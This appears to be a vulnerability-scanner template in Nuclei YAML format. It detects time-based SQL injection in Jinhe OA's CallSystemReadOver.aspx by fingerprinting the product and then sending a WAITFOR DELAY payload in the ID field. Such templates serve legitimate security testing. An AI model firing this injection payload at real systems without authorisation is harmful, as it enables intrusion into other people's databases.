id: poc-yaml-jinher-callsystemreadover-aspx-sqli
info:
  name: Jinhwa OA CallSystemReadOver.aspx SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    金和OA CallSystemReadOver.aspx is vulnerable to SQL injection through a time-based delay technique.

variables:
  t1: "{{rand_int(2,5)}}"
  t2: "{{to_number(t1) + 2}}"

http:
  - raw:
      - |
        GET /C6/Jhsoft.Web.login/PassWordSlideFull.aspx HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "JHSoft"

  - raw:
      - |
        POST /c6/JHBase.Web.Menu/CallSystemReadOver.aspx/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        ID='WAITFOR DELAY'0:0:{{t1}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - ""
      - type: dsl
        dsl:
          - "duration > to_number(t1)"
          - "duration < to_number(t2)"
